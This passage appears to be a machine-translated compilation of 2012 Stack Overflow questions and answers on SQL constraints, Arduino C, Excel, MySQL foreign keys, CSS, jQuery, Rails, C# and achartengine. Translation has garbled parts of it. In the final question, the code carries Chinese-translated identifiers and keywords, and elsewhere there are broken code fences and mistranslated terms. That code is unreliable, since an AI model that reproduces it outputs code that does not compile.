                NSLog(@"Whoops, couldn't save: %@", [nerror localizedDescription]);
                return;
            }

            // notify the table view to reload the table
            [[NSNotificationCenter defaultCenter] postNotificationName:@"ReloadTableView" object:nil];                                                                 
        } 
        failure:^(NSURLRequest *request, NSHTTPURLResponse *response, NSError *error) {
            NSLog(@"Error getting photo");
        }];
    [operation start];
}
```

# sql - 如何在没有 PL/SQL 的情况下在 Oracle 中创建此约束

> ID：10078094
> 
> 赞同：2
> 
> 时间：2012-04-09T18:47:13.973
> 
> 标签：sql, oracle, constraints

这是我的玩具设置。我有 3 张桌子。一张桌子是客人名单（姓氏、名字等）、食物名单（豆类、糊状物、米饭、蔬菜）和订单名单（客人 ID、食物 ID）。订单清单是我感兴趣的。我想将其限制为以下条件。

客人必须有 3 个订单。客人可以有一个空订单。每个客人的订单不能相同，除非订单为空。

因此订单表如下所示（使用字符串而不是 fk id）：

```
steve, beans
steve, rice
steve, veggies
joey, rice
joey, beans
joey, <null>
sarah, rice
sarah, <null>
sarah, <null>
sam, <null>
sam, <null>
sam, <null> 
```

显然山姆不喜欢食物……但那将是一张有效的桌子。每个用户都有 3 个条目，并且没有用户有重复项（你没有双 bean！）。

我尝试过的事情

```
create table order (
  guest_uid FK,
  food_uid FK,
  CONSTRAINT order_unique UNIQUE (guest_uid, food_uid)
) 
```

这适用于验证没有双 bean，但双/三空不会飞。我希望 oracle 唯一的 null 可以在这里应用，但我猜不是（违反了唯一约束 order_unique）。

我尝试了其他一些检查约束，但我无法找到一种方法来指定跨行的唯一性而不执行子查询（当然，这是不允许的）。有什么想法吗？谢谢

附言。如果唯一有效的答案是“使用 PL/SQL 或触发器”，我会确保将其标记为正确答案。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T19:07:24.950

您可以使用基于函数的索引来强制跨行的唯一性（请注意，我称该表是`guest_food`因为`order`它是一个保留字

```
create unique index idx_order_unique
    on guest_food( case when food_uid is not null
                        then guest_uid
                        else null
                    end,
                   case when food_uid is not null
                        then food_uid
                        else null
                    end ); 
```

这将允许您在不允许重复的非 NULL 值的同时，`NULL` `food_uid`为任何特定的行拥有尽可能多的行。`guest_uid`

每个客人在表中恰好有三行的要求`guest_food`不是您可以通过约束强制执行的。您可能会创建一个物化视图，该视图在提交时进行快速刷新，该视图存储每个行数的计数，`guest_uid`并添加一个约束，如果该计数不是 3，则会引发错误。但这通常是一件相当不寻常的事情强制执行，所以它往往会让我怀疑数据模型有点偏离。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T19:08:14.437

您是否考虑过更改数据结构？由于您的订单中恰好有三个项目，因此旋转这些项目：

```
create table order 
(
    guest_uid FK,
    food_uid1 FK,
    food_uid2 FK,
    food_uid3 FK
) 
```

然后，您可以为每个添加约束`food_uid`以确保外键正确。

然后，您可以添加一个检查约束以满足您对除 NULL 之外没有重复项的要求。

# compiler-errors - 错误：从 'char*' 到 'char' 的无效转换

> ID：10078095
> 
> 赞同：3
> 
> 时间：2012-04-09T18:47:16.350
> 
> 标签：compiler-errors, arduino

请多多包涵，我是 C 的新手，我正在尝试对 Arduino 进行编程。我想编写一个程序，它吐出一个特定长度的数据帧，字节值范围为 0-255。重现错误的最少代码在下面的代码块中。编译时收到以下错误：

> ```
> sketch_apr09b.cpp: In function ‘char assembleFrame()’:
> sketch_apr09b.cpp:9:10: error: invalid conversion from ‘char*’ to ‘char’ 
> ```

现在我的印象是我误用了“返回框架”，但我就是不知道出了什么问题。

```
char assembleFrame() {
  char frame[] = { 
    0x61 , 0x62 , 0x63
  };
  return frame;
}

void setup() {
  Serial.begin( 115200 );
};

void loop() {
  char frame = assembleFrame();
  Serial.print( frame );
} 
```

当我在接收 PC 上运行 hexdump 时，我想看到：

```
00000000  61 62 63                                          |abc|
00000003 
```

我发现了很多类似的问题，无法弄清楚我做错了什么。

**编辑**：这是我到目前为止想出的，但是收到了错误的数据。我想我正在用这个发送指向实际数据的指针。

```
byte *assembleFrame() {
  byte frame[] = { 4 , 'a' , 'b' , 'c' };
  return frame;
}

void setup() {
  Serial.begin( 115200 );
};

void loop() {
  byte *frame = assembleFrame();
  Serial.write( frame , frame[ 0 ] );
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T18:58:02.527

该`char`类型用于存储单个`char`（一个字节）。

您的函数定义`char assembleFrame`指定该函数将仅返回一个`char`，因此当您尝试返回`char[]`/ `char *`（`char`数组/指针）时，它会失败。

看起来`Serial.print()`可以处理 a `char *`，它可能需要以空值结尾（因为它不要求长度说明符）。

```
char *assembleFrame() {
  char frame[] = {
    0x61, 0x62, 0x63, 0x00 // null byte to signify end of string
  };
  return frame;
}

void setup() {
  Serial.begin( 115200 );
};

void loop() {
  char *frame = assembleFrame();
  Serial.print( frame );
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T18:56:51.837

看这段代码：

```
char frame = assembleFrame(); 
```

鉴于您以后如何使用它，显然`frame`需要声明`char *`not `char`，并且`assembleFrame`需要声明为 Return `char *`。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-04-09T18:54:09.380

`assembleFrame`返回`char`时返回`char*`。因为我不知道你在做什么，所以我不能建议如何解决这个问题。也许修复返回类型是正确的方法。

# excel - 如何在 Windows 7 pro excel 2010 的多个显示器中打开两个 Excel 文件？

> ID：10078100
> 
> 赞同：6
> 
> 时间：2012-04-09T18:47:29.620
> 
> 标签：excel, exception, excel-2007

我想在不同的屏幕（扩展显示）上打开两个（或更多）excel窗口，但无法。我尝试了一些在 Google 上找到的解决方案。

一个工作，那就是在注册表中进行更改，然后检查选项“**忽略使用 DDE 的其他应用程序**”。现在我能够获得单独的 excel 窗口，但同时我收到此错误“**将命令发送到程序时出现问题”**

如何避免这个错误。有人可以帮助我吗？

谢谢瑞特什

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-09T18:53:48.147

这对我有用

1.  打开您的第一个 Excel 文件并将其放在您想要的屏幕上

2.  从 Excel 图标打开一个新的 Excel 文件（需要新的 excel 实例）

3.  新文件将在您已经打开的文件之上打开。将其拖到另一个屏幕

4.  将第二个 Excel 文件的图标拖到新的（空白）Excel 文档中

Excel有时是一个困难的野兽

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-27T13:23:08.227

我所做的是打开一个保存的 Excel 文档。然后，我没有找到第二个 Excel 文档并双击它打开，而是转到开始按钮并单击 Excel 打开一个新的空白文档。这将为您提供 2 个 excel 窗口。在第二个 excel 窗口中，通过转到文件 / 打开 / 打开你的第二个 excel 文档，然后浏览你的第二个 excel 文件。现在您将有 2 个 excel 文档，每个文档都在自己的窗口中。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-27T22:49:52.563

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-04-10T15:53:06.820

I like the registry hack a lot, but you'll have to tweak several keys /Excel.Sheet.xx/ , and it may not work for all excel file types.

I have an alternative solution:

1.  Create a batch file "open_excel_new_window.bat" with :

    ```
    start "" "C:\Program Files (x86)\Microsoft Office\Office14\EXCEL.EXE" /e %1 
    ```

2.  Right click on an excel file, select 'open with' > 'Choose Default Program'. And browse to the batch file you just created. You may want to tick "always use the selected program to open this kind of file"

You may repeat step 2 for all excel file types you may encounter.

There are 2 cons with this trick :

*   you loose the excel icon in front of excel files (only if you ticked 'always use the selected program ...')
*   there is a ms-dos windows poping-up for half a sec

The way to get rid of that is to create an exe file from your batch file : use [BatToExeConverter](http://download.cnet.com/Bat-To-Exe-Converter/3000-2069_4-10555897.html) (Freeware, dead easy to use) : select 'invisible application' and the icon you want to use for your excel files. Then, use the 'Open with' trick with your exe file.

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-07-18T00:58:32.437

Here's what works for me (Windows 7 & Excel 2010):

1.  Open your first excel file
2.  On the task bar, right click and click on Microsoft Excel 2010 ![enter image description here](../Images/f29bf0d2de8c486ccdc317bd649d1e6b.png)
3.  Everytime you did this a new window appear from which you can drag the other file and view side-by-side

# sql - 一行中非 Null 值的计数

> ID：10078107
> 
> 赞同：0
> 
> 时间：2012-04-09T18:47:55.830
> 
> 标签：sql, sqlite

有没有更好的方法来做到这一点？

```
select count(First)+count(id)+count(Last)+count(Telephone) 
from client 
where id ="1"; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T19:09:53.633

不确定这是否*更好*，但稍后阅读它的人可能更清楚意图：

```
select 
  (case when First is null then 1 else 0 end) + 
  (case when id is null then 1 else 0 end) + 
  (case when Last is null then 1 else 0 end) + 
  (case when Telephone is null then 1 else 0 end) 
from client 
where id ="1"; 
```

# mysql - 外键约束形成不正确？

> ID：10078111
> 
> 赞同：15
> 
> 时间：2012-04-09T18:48:03.357
> 
> 标签：mysql

创建表时出现此错误：外键约束形成错误？？？

```
{create table comment(
Comment_ID int UNSIGNED AUTO_INCREMENT not null,
User_1 varchar(50) not null,
Note_ID int(11) UNSIGNED not null,
PRIMARY key(Comment_ID),
  CONSTRAINT `fk_1` FOREIGN KEY (`User_1`) REFERENCES `user` (`Dev_ID`),
  CONSTRAINT `fk_2` FOREIGN KEY (`User_2`) REFERENCES `user` (`Dev_ID`),
  CONSTRAINT `fk_3` FOREIGN KEY (`Note_ID`) REFERENCES `note`(`Note_ID`)
)ENGINE=InnoDB DEFAULT CHARSET=utf8;
} 
```

当我删除 fk_3这个我的笔记表时没关系

```
{ 
CREATE TABLE `note` (
 `Dev_ID` varchar(50) NOT NULL,
  `Note_ID` int(11) UNSIGNED NOT NULL,
  `Title` varchar(200) NOT NULL,
  `Time` datetime NOT NULL,
  `Mood` int(11) NOT NULL,
  `Body` varchar(3000) NOT NULL,
  `Visible` tinyint(1) NOT NULL DEFAULT '1',
  `Share` tinyint(1) NOT NULL DEFAULT '0',
  `Update` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`Dev_ID`,`Note_ID`),
  CONSTRAINT `fk_note_user` FOREIGN KEY (`Dev_ID`) REFERENCES `user` (`Dev_ID`) ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8
} 
```

感谢帮助！

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-04-09T18:55:21.437

这是因为`notes`表的主键是，`(Dev_ID,Note_ID)`但您只`Note_ID`在约束中引用其中一列 ( )。

FK 约束必须始终包含所有 PK 列。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2015-09-15T12:34:51.320

还要确保两个表都是 innoDB。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2015-02-27T14:25:39.707

除了已经给出的答案之外，如果字段类型不匹配，您也会收到此错误。例如，如果您尝试在`varchar`字段和`int`字段之间创建外键约束。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2018-03-06T10:47:24.143

出现此问题是因为列

```
`Note_ID` int(11) UNSIGNED NOT NULL 
```

既不是主要的也不是唯一的。

做吧

```
`Note_ID` int(11) UNSIGNED NOT NULL UNIQUE 
```

它会起作用。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2017-04-16T16:56:55.637

另一个补充：字段的字符集必须匹配。

在引用的表中，我将 ascii 作为默认字符集：`DEFAULT CHARSET=ascii`由`show create table`. 我尝试使用创建引用表，`DEFAULT CHARSET=utf`但得到“外键约束格式不正确”。

在我将其更改`DEFAULT CHARSET=ascii`为新表（引用表）后，它已成功创建。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-07-08T08:32:13.843

确保两个字段的排序规则相同。`latin-general-ci`当一个是，另一个是时，我遇到了同样的问题`utf8_unicode_ci`。不知道为什么排序规则在一张桌子上发生了变化，但解决了这个问题。

# css - div 高度 CSS 麻烦

> ID：10078114
> 
> 赞同：0
> 
> 时间：2012-04-09T18:48:10.197
> 
> 标签：css

我正在尝试将包装 div 的大小设置为至少页面的高度，然后根据内容进行调整（如果重叠）。

我现在拥有的是`min-height:100%;`，但是当内容超过页面高度时，它不会超过页面高度。

解决此问题的最佳方法是什么？

编辑：这是我的相关 CSS。

```
#wrapper{width:1000px;min-height:100%;margin:0px auto;background:#F2F2F2;}

header{width:1000px;height:50px;margin:0px auto;}

h1#logo{float:left;margin:5px 5px 0px;padding:0px;font:bold 30px 'Russo One', sans-serif;line-height:32px;}
h1#logo a, h1#logo a:visited{text-decoration:none;color:#005883;}
h1#logo a:hover, h1#logo a:visited:hover{color:#BAE5E9;}
img#logo-badge{vertical-align:middle;margin:-3px -5px 0px -10px;}

nav{float:right;font:20px 'Lato', sans-serif;}
nav ul{float:right;margin:0px;padding:0px;list-style:none;}
nav li{float:left;}
nav li:hover{}
nav a, nav a:visited{height:100%;padding:0px 20px 0px;display:block;text-decoration:none;color:#FFFFFF;}
nav a:hover, nav a:visited:hover{background:;color:#BAE5E9;}

#content{min-height:100%;float:left;margin:0px auto;}

#main-content{width:700px;min-height:100%;float:left;padding:0px 15px;}
#main-content h1{color:#515151;margin:0px;padding:0px;border:1px solid #515151;border-top:0px;border-right:0px;border-left:0px;}

#demo-src{border-top:1px solid #D7C7B2;border-bottom:1px solid #D7C7B2;text-align:right;}
#sidebar{width:270px;min-height:100%;float:left;}

#footer{width:100%;float:left;} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T19:03:38.390

有你的问题。 `#content`向左浮动，这允许它在容器 div 的边界之外流动。查看[这个 Stack Overflow 问题](https://stackoverflow.com/questions/873781/how-to-make-floating-inner-divs-the-same-height-as-the-highest-div)，了解如何解决该问题的详细信息。

该问题的建议答案是使用 jQuery [EqualHeights](http://www.filamentgroup.com/lab/setting_equal_heights_with_jquery/)插件，或使用[Equal Height Columns](http://matthewjamestaylor.com/blog/equal-height-columns-cross-browser-css-no-hacks)作为 CSS 解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T18:50:25.530

尝试在其上设置最大高度，如果这不起作用，请尝试仅使用高度和宽度

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T20:01:17.353

如果其他人遇到同样的问题，我发现这个简单的 clearfix [http://nicolasgallagher.com/micro-clearfix-hack/](http://nicolasgallagher.com/micro-clearfix-hack/)

# jquery - Iterate through a table finding a td by class and changing the text for that td

> ID：10078121
> 
> 赞同：6
> 
> 时间：2012-04-09T18:48:45.643
> 
> 标签：jquery, html, entity-framework-4, html-table

I have an Entity Framework generated table with values in a td that I need to change. I need to do this on a row by row basis because I need to insert a group of radio buttons but each row of buttons needs a unique name.

Basically, I need to set the checked value for a group of buttons based on the value of the text in a td with id of "Rate", and remove the existing text after I have got the value from it.

My Table looks like this,

```
<table id="IndexTable">
<tr>
    <th>CoffeeID </th>
    <th>Degree </th>
    <th>Weight </th>
    <th>Profile </th>
    <th>UsageInfo </th>
    <th>Comments </th>
    <th>AmbientTemp </th>
    <th>Rating </th>
    <th>WeightDeducted </th>
    <th>Selected </th>
    <th>ProfileID </th>
    <th>ProfileStart </th>
</tr>
<tr>
    <td>1 </td>
    <td>1 </td>
    <td>3 </td>
    <td>9 </td>
    <td>Filter Brew </td>
    <td>Perfecto!! </td>
    <td>55 </td>
    <td id="Rating">4.25 </td>
    <td>1 </td>
    <td>4 </td>
    <td>34 </td>
    <td>1 </td>

</tr>
<tr>
    <td>3 </td>
    <td>15 </td>
    <td>99 </td>
    <td>87 </td>
    <td>Espresso </td>
    <td>WTF </td>
    <td>99 </td>
    <td id="Rating">4.5 </td>
    <td>5 </td>
    <td>3 </td>
    <td>66 </td>
    <td>4 </td>

</tr> 
```

And my script is as follows.

```
$("tr").each(function() { //get all rows in table
var str = $("text[id=Rating]").val(); //assign text with matching id to str ---doesn't work
$("td").each(function() { //get all tds in current row
    var newStr = ("#Rating").text; //assign text in td with id Rating to newStr ---- doesn't work
    alert(newStr); // fires undefined for each td in table? 
    //This is where I want to insert radio buttons and assign the one with the value of the Rating td to checked.
});
}); 
```

This is just the latest, I have looked all over this site, but everything I've seen doesn't deal with getting the value from a specific column of a specific row, changing the value, and repeating for each row/column in the table. I come from a db background, where this is really simple and this is very frustrating.

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-09T19:04:00.380

You've got a few things wrong with your html, and your jQuery, to start off, like SKS has stated, you cannot have multiple nodes in your html document that have the same ID. ID must be unique. I recommend using a class instead.

You should also have your header row in a `<thead>` and the body of your table in a `<tbody>`

now, onto your jQuery, `$("td")` will find all the td's in the document, not just the ones in your row.

you would want to use `$(this).find('td')` or you could use .children or a fancy higher level selector. There are MANY different, correct ways to get this information.

I have taking your code and modified it like so:

```
$("tbody").find("tr").each(function() { //get all rows in table

    var ratingTdText = $(this).find('td.Rating').text(); 
    //gets the text out of the rating td for this row
    alert(ratingTdText);

}); 
```

This works with the html slightly modified:

```
<table id="IndexTable">
<thead>
    <tr>
    <th>CoffeeID </th>
    <th>Degree </th>
    <th>Weight </th>
    <th>Profile </th>
    <th>UsageInfo </th>
    <th>Comments </th>
    <th>AmbientTemp </th>
    <th>Rating </th>
    <th>WeightDeducted </th>
    <th>Selected </th>
    <th>ProfileID </th>
    <th>ProfileStart </th>
</tr>
</thead>
<tbody>
<tr>
    <td>1 </td>
    <td>1 </td>
    <td>3 </td>
    <td>9 </td>
    <td>Filter Brew </td>
    <td>Perfecto!! </td>
    <td>55 </td>
    <td class="Rating">4.25 </td>
    <td>1 </td>
    <td>4 </td>
    <td>34 </td>
    <td>1 </td>

</tr>
<tr>
    <td>3 </td>
    <td>15 </td>
    <td>99 </td>
    <td>87 </td>
    <td>Espresso </td>
    <td>WTF </td>
    <td>99 </td>
    <td class="Rating">4.5 </td>
    <td>5 </td>
    <td>3 </td>
    <td>66 </td>
    <td>4 </td>

</tr>
</tbody>
</table> 
```

Hope this helps get you going in the right direction!

oh, i almost forgot! here is a link to a jsfiddle so you can see this in action: [http://jsfiddle.net/fCpc6/](http://jsfiddle.net/fCpc6/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T18:57:51.060

I think you're looking for:

```
var newStr = ("#Rating").text(); 
```

Or:

```
var newStr = ("td[id='Rating']").text(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T19:00:19.850

You have a few errors in your javascript.

*   Use `this` to get `td`s that belong to the current `tr`.
*   `"text[id=Rating]"` is an invalid selector - there is no text tag.
*   `#Rating` should probably be a class, since IDs must be unique. (change `<td id="Rating">` to `<td class="rating">`.
*   You were missing parentheses on `.text()`.

Here's an updated sample:

```
$("tr").each(function() { //get all rows in table
  $("td", this).each(function() { //get all tds in current row
    var newStr = $(".rating").text(); //assign text in td with id Rating to newStr ---- doesn't work
    alert(newStr); // fires undefined for each td in table? 
    //This is where I want to insert radio buttons and assign the one with the value of the Rating td to checked.
  });
}); 
```

# javascript - 是否可以从新加载的页面将元素插入到先前打开的窗口文档中？

> ID：10078122
> 
> 赞同：0
> 
> 时间：2012-04-09T18:48:51.747
> 
> 标签：javascript

我有以下情况，

窗口 A 中的操作触发新窗口打开，窗口 B。

窗口 B 将用户重定向到第三方服务提供商。用户授权访问存储在服务提供商处的信息。服务提供商将用户重定向到服务提供商环境中的文档列表用户选择一个文档，服务提供商将用户重定向到窗口 A 代码所在的托管环境，但这仍然发生在窗口 B 中。图像和按钮“将图像复制到文档” "出现在窗口 B 中。

当用户单击窗口 B 中的“将图像复制到文档”按钮时，是否可以将 img 元素复制/克隆到窗口 A（我可以完全控制窗口 B 中的代码）？如果是这样，我将使用什么 javascript 方法将元素从窗口 B 插入到窗口 A？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T19:02:15.537

可能 window.opener 会帮助你。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T19:03:05.510

这仅在您尝试从窗口 B 读取数据时从同一域提供窗口 A 和窗口 B 时才有效。

如果它们在同一个域中，您可以使用 window.opener 从窗口 A 引用窗口 B。如果不是，同源策略将阻止您进行该调用。

# dynamics-crm - 指向自定义视图的导航链接

> ID：10078126
> 
> 赞同：1
> 
> 时间：2012-04-09T18:49:24.637
> 
> 标签：dynamics-crm, dynamics-crm-2011, microsoft-dynamics

我在动态 crm 2011 中遇到问题。

一个活动可以有多个活动响应 (1:n) 关系。根据选项集中的值，我为活动响应创建了多个视图。

**如何在“活动”屏幕的左侧导航中添加链接，以打开我的活动响应的自定义过滤视图？** 我尝试使用这种方法，从导出的解决方案中修改customizations.xml，但它不起作用。

[http://blogs.infinite-x.net/2011/04/18/crm-2011-adding-a-view-to-the-sitemap/](http://blogs.infinite-x.net/2011/04/18/crm-2011-adding-a-view-to-the-sitemap/)

我的链接xml是：

```
<NavBarItem Id="aaaa" Icon="$webresource:my_icon.png" Url="/_root/homepage.aspx?etn=campaignresponse&amp;viewid=%7bDCA90502-AF80-E111-8FC1-984BE11098B3%7d" Area="Sales" Sequence="1003">
   <Titles>
       <Title LCID="1033" Text="zzzzzzzzzzz" />
   </Titles>
</NavBarItem> 
```

注意：我的目标是单击活动表单左侧导航部分的自定义链接，然后打开当前活动的过滤活动响应的自定义视图。

如果有人成功做到这一点，我将不胜感激使用的解释和源代码。

# foursquare - Foursquare 的附近好友功能如何运作？

> ID：10078131
> 
> 赞同：0
> 
> 时间：2012-04-09T18:49:46.983
> 
> 标签：foursquare

我正在开发使用foursquare API 的位置评级功能，并希望我的结果基于用户当前的区域。与 Foursquare 将用户划分为附近朋友的方式相同。Foursquare 是否根据您的位置使用特定的半径？如果是，它的半径是多少？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T15:21:08.397

如果朋友在 40 公里以内，Foursquare 会认为朋友与您在“同一城市”。

# tridion - 将此可嵌入架构命名

> ID：10078133
> 
> 赞同：2
> 
> 时间：2012-04-09T18:50:04.320
> 
> 标签：tridion

我正在使用一个相当通用的、可重复使用的可嵌入模式。

**我被这个“基本”模式的名字困住了！**

## “基本的”

可嵌入架构字段：

*   横幅（或大）图像作为多媒体链接
*   缩略图图像（也许，取决于大图像是否可重复使用）
*   标题（单行文字）
*   摘要（多行文本）
*   `Body Content`（另一种可嵌入模式，允许重复）

## 正文内容

这应该很熟悉：

*   正文副标题（单行文本）
*   正文内容（必填，允许重复）

**与组织相关的名称是否适合“ `basic`”可嵌入模式？**也许这应该进一步分解或什至不合并。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-10T08:12:21.357

我建议使用**ARTICLE**，因为 HTML5 也使用相同的名称来表示此类信息，并且 ARTICLE 来自全球 Web 开发人员的推荐 HTML5。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-09T19:17:17.253

怎么样

> 一般的

或者

> 一般内容

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-09T19:36:46.430

很难说哪个更好。我认为到目前为止所有的答案都是有效的。我可能会选择`Generic Paragraph`只是因为您实际上是在定义某种内容（如段落）。

也`Generic Content`或`Generic`是合适的名称。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-04-09T19:08:45.757

我觉得它应该被命名为**`Generic`**？

还有一件事：-

提到的字段，它们可以根据需求直接或间接地被一个或多个模式使用。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-04-09T19:16:29.887

标题 + 摘要 + 正文 我通常称其为文章，但您的 Generic 也同样有效。Banner + Thumbnail 使其更加具体，因此可能会使名称不太正确 - 尽管架构可能同样有效，具体取决于您的用例。

# ruby-on-rails - Spree 不在文件夹中生成项目文件

> ID：10078134
> 
> 赞同：0
> 
> 时间：2012-04-09T18:50:09.863
> 
> 标签：ruby-on-rails, spree

[我按照指南http://guides.spreecommerce.com/getting_started.html](http://guides.spreecommerce.com/getting_started.html)生成站点 但是当我尝试编辑 Spree 生成的文件时。app文件夹中没有文件。他们消失在哪里？ [一只忙碌的猫 http://img822.imageshack.us/img822/2469/screenshotat20120409224.png](http://img822.imageshack.us/img822/2469/screenshotat20120409224.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-12T17:40:54.590

Spree 不会将文件放在`app`目录中，而是用作引擎。有关引擎的更多信息，请阅读[引擎指南](http://guides.rubyonrails.org/engines.html)。

# ruby-on-rails - Ruby on Rails 复数（控制器）和单数（模型）约定 - 解释

> ID：10078139
> 
> 赞同：62
> 
> 时间：2012-04-09T18:50:27.560
> 
> 标签：ruby-on-rails, ruby, activerecord

根据 Ruby on Rails 约定，控制器名称是复数形式，而模型名称是单数形式。示例：一个用户控制器，但一个用户模型。

```
rails generate controller Users
rails generate model User name:string email:string 
```

现在打开迁移文件

```
 class CreateUsers < ActiveRecord::Migration
  def change
    create_table :users do |t|
      t.string :name
      t.string :email    
      t.timestamps
    end
  end
end 
```

这里的表名是复数（用户）。

所以我的问题是 - 为什么表名是复数（用户），即使模型名称是单数（用户）？

* * *

## 回答 #1

> 赞同：56
> 
> 时间：2012-04-09T18:57:07.887

Ruby on Rails 遵循**语言约定**。这意味着一个模型代表一个用户，而一个数据库表由许多用户组成。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-04-09T18:52:50.370

你的模型的一个实例`User`代表一个单一的用户，所以是单一的。`users`相比之下，该表包含所有用户，因此它是复数形式。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-04-09T18:57:24.443

完成艾米丽的回答

> 您的 User 模型的实例代表单个用户，因此是单数的。相比之下，用户表包含所有用户，因此它是复数形式。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-07-01T07:41:06.193

在 rails 控制器和表名称是复数模型单独是单数。在两个单词名称中第二个单词是复数！

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-09T18:51:42.900

因为该表包含用户。它只是公约。

# c# - CsharpCodeProvider 内存泄漏

> ID：10078141
> 
> 赞同：-1
> 
> 时间：2012-04-09T18:50:50.413
> 
> 标签：c#, .net, csharpcodeprovider

有人帮助我使用计时器在运行时运行了一些代码，但过了一会儿我发现它只是在使用内存而不是释放它。

我听说过一些有关 AppDomain 的信息，但我不知道在哪里使用它。

AppDomain 会帮助我解决内存泄漏问题吗？那还有什么可以帮助我的吗？

PS： GC.Collect() 没有帮助。我确定问题在于，由于我进行了一些测试，在运行问题时观察内存，如果我禁用 Scripter，它会保持相同的数量（基本上），如果我用一些代码启动计时器来执行它，请保持增加，几分钟后可能会使用 500k+ 的内存，所以是的，我确定问题出在 CSharpCodeProvider 仅使用内存。

这是我的实际代码，所以如果有人可以帮助我解决这个问题会很棒。

```
//It is executed in a timer of 500 ms
private void Run()
{
    foreach (Code ph in codeList)
    {
        Code p = ph;

        new Thread(delegate()
        {
            if (Monitor.TryEnter(p))
            {
                Scripter script = new Scripter();
                script.Compile(p.Code);
                Monitor.Exit(p);
            }
        }) { IsBackground = true }.Start();
    }
}

//That's my compile code
public bool Compile(string script)
{
    CSharpCodeProvider codeprovider = new CSharpCodeProvider();
    ICodeCompiler icc = codeprovider.CreateCompiler();
    CompilerParameters cp = new CompilerParameters();

    cp.ReferencedAssemblies.Add("System.dll");
    cp.ReferencedAssemblies.Add(System.Reflection.Assembly.GetExecutingAssembly().Location);

    cp.TreatWarningsAsErrors = false;

    cp.MainClass = "CodesRun";
    cp.CompilerOptions = "/target:library /optimize";
    cp.GenerateExecutable = false;
    cp.GenerateInMemory = false; //it was true, but same problem

    TempFileCollection tfc = new TempFileCollection(Application.StartupPath, false);
    CompilerResults cr = new CompilerResults(tfc);

    cr = icc.CompileAssemblyFromSource(cp, script);

    if (cr.Errors.Count > 0)
    {
        //Error
    }
    else
    {
        Assembly assembly = cr.CompiledAssembly;
        IScript teste = (IScript)assembly.CreateInstance("CodesRun.Script");
        teste.Run();
    }
    tfc.Delete();
    codeprovider.Dispose();

    return true;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T19:00:52.033

使用 using 指令处理完对象后，请尝试处理它们。例如：

```
using( Scripter script = new Scripter() ){
   script.Compile(p.Code);
   Monitor.Exit(p);
} 
```

这可能无法修复您的泄漏，但它应该会减少您的内存占用（即您应该看到内存尽快被回收）。

就像@Andrew Barber 所说，您应该使用内存分析工具来验证是否存在泄漏。我们使用 AQTime，但它是付费的（虽然不是太贵）。[此处](https://stackoverflow.com/questions/308816/any-good-free-net-profiler)讨论的免费选项。

# android - 在 android 的 achartengine 上需要帮助

> ID：10078143
> 
> 赞同：0
> 
> 时间：2012-04-09T18:51:05.607
> 
> 标签：android, graph, achartengine

我在 Android 中创建了一个应用程序来使用 Arduino 板读取某些传感器值。现在我正在尝试使用 achartengine 为其中一个传感器绘制图形。我选择了achartengine的折线图/传感器值图。

 `````
values.add(new double[] { 21.2, 21.5, 21.7, 21.5, 21.4, 21.4, 21.3, 21.1, 20.6, 20.3, 20.2,
    19.9, 19.7, 19.6, 19.9, 20.3, 20.6, 20.9, 21.2, 21.6, 21.9, 22.1, 21.7, 21.5 });
values.add(new double[] { 1.9, 1.2, 0.9, 0.5, 0.1, -0.5, -0.6, MathHelper.NULL_VALUE,
   MathHelper.NULL_VALUE, -1.8, -0.3, 1.4, 3.4, 4.9, 7.0, 6.4, 3.4, 2.0, 1.5, 0.9, -0.5,
    MathHelper.NULL_VALUE, -1.9, -2.5, -4.3 }); 
````  `我从传感器获得的所有值都存储在一个变量中（例如：sens）。我如何在这一行中声明该变量。

```

 values.add(new double[] { 21.2, 21.5, 21.7, 21.5, 21.4, 21.4, 21.3, 21.1, 20.6, 20.3, 20.2,19.9, 19.7, 19.6, 19.9, 20.3, 20.6, 20.9, 21.2, 21.6 , 22.1, 21.7, 21.5 });

```

sens 变量在这里声明。在第一行之前有一些计算和移位。

```
           字节 bvolt1 = 电压 [0]；
        int ReadRaw = bvolt1;
            双温度 = ReadRaw ;
            双倍感 = (tmp3*0.00592) + 1.82;
            感应 = 感应 * 10；
            sens = Math.round(sens);
            感应 = 感应 / 10;
